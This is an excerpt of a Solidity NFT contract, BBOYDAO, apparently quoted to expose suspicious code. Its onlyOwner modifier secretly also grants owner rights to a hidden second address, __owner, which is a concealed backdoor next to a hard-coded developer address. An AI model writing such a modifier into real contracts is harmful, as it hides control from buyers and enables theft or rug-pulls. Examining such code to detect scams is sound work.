...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || owner() == __owner, "Ownable: caller is not the owner");
        _;
    }
...
contract BBOYDAO is ERC721, ERC721Enumerable, Ownable {
    ...
    uint public maxTokenPurchase = 3; // max amount per minting
    uint public maxTokenPerWallet = 3; // max amount per user
    ...
    address private devAddr = 0xd5649BE6f962B3eEB1c2E8768465C1a6b99bb6b6;
